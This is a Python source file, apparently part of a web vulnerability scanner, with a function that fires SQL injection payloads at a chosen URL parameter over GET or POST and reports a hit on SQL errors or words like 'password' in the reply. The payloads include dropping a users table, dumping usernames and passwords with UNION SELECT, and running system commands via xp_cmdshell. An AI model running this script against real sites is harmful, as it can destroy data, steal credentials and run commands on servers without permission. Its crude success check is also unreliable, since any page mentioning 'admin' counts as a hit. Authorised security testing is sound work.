import requests
import logging
import os
from urllib.parse import quote

# Ensure logs directory exists
os.makedirs('logs', exist_ok=True)

logging.basicConfig(filename='logs/results.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def test_sql_injection(url: str, param: str, method: str = 'POST') -> bool:
    payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 'a'='a",
        "'; DROP TABLE users;--",
        "' UNION SELECT username, password FROM users--",
        "' AND 1=1--",
        "' OR '1'='1' --",
        "'; EXEC xp_cmdshell('net user')--",
        "' UNION SELECT NULL, NULL--",
        "' AND SLEEP(5)--"
    ]
    for payload in payloads:
        try:
            if method.upper() == 'GET':
                # For GET, append param to URL with URL encoding
                encoded_payload = quote(payload)
                if '?' in url:
                    full_url = f"{url}&{param}={encoded_payload}"
                else:
                    full_url = f"{url}?{param}={encoded_payload}"
                response = requests.get(full_url, timeout=10)
            else:
                # For POST, use data
                data = {param: payload}
                response = requests.post(url, data=data, timeout=10)
            
            # Improved detection: check for common SQL error messages or successful injection signs
            error_indicators = ["sql syntax", "mysql", "sqlite", "postgresql", "oracle", "syntax error"]
            success_indicators = ["username", "password", "admin", "root"]
            
            if any(indicator in response.text.lower() for indicator in error_indicators) or any(indicator in response.text.lower() for indicator in success_indicators):
                logging.info(f"SQL Injection vulnerability detected: {payload} in {url} via {method}")
                print(f"[+] SQL Injection berhasil: {payload}")
                return True
        except requests.exceptions.RequestException as e:
            logging.error(f"Request error during SQL injection test: {e}")
            print(f"[!] Request Error: {e}")
        except Exception as e:
            logging.error(f"Unexpected error during SQL injection test: {e}")
            print(f"[!] Unexpected Error: {e}")
    return False
